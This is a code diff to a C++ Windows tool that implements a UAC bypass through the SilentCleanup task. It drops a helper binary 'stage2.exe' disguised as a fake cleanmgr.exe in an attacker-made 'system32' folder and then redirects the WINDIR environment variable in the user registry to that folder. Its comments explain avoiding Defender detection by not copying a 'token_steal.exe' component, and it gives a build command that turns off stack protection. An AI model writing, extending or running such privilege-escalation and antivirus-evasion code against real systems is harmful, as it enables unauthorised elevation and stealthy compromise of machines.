@@ -174,13 +174,31 @@ bool TrySilentCleanup(const char* myExePath) {
     // Wipe any stale result file so we don't false-positive
     DeleteFileA("C:\\exclusiontest\\exclusion_result.txt");
 
-    // 1. Drop ourselves as fake cleanmgr.exe
+    // 1. Drop stage2.exe (minimal clean binary) as fake cleanmgr.exe.
+    //    We do NOT copy token_steal.exe -- it has suspicious strings that Defender
+    //    will flag when the process launches from a non-System32 path.
     CreateDirectoryA("C:\\exclusiontest\\system32", nullptr);
     const char* fakeMgr = "C:\\exclusiontest\\system32\\cleanmgr.exe";
-    if (!CopyFileA(myExePath, fakeMgr, FALSE)) {
-        WinErr("CopyFile -> cleanmgr.exe"); return false;
+
+    // stage2.exe lives next to us -- build its path from our own path
+    char stage2[MAX_PATH] = {};
+    strncpy(stage2, myExePath, MAX_PATH - 1);
+    // Replace filename with stage2.exe
+    char* slash = strrchr(stage2, '\\');
+    if (slash) strcpy(slash + 1, "stage2.exe");
+    else strcpy(stage2, "stage2.exe");
+
+    DBG("stage2 path: %s", stage2);
+    if (GetFileAttributesA(stage2) == INVALID_FILE_ATTRIBUTES) {
+        ERR("stage2.exe not found at %s -- compile it first:", stage2);
+        ERR("  cl.exe stage2.cpp /O2 /GS- /link advapi32.lib kernel32.lib /subsystem:windows /entry:mainCRTStartup /out:stage2.exe");
+        return false;
     }
-    OK("Fake cleanmgr.exe placed at %s", fakeMgr);
+
+    if (!CopyFileA(stage2, fakeMgr, FALSE)) {
+        WinErr("CopyFile stage2.exe -> cleanmgr.exe"); return false;
+    }
+    OK("stage2.exe placed as %s", fakeMgr);
 
     // 2. Set HKCU\Environment\WINDIR = C:\exclusiontest
     HKEY hEnv = nullptr;
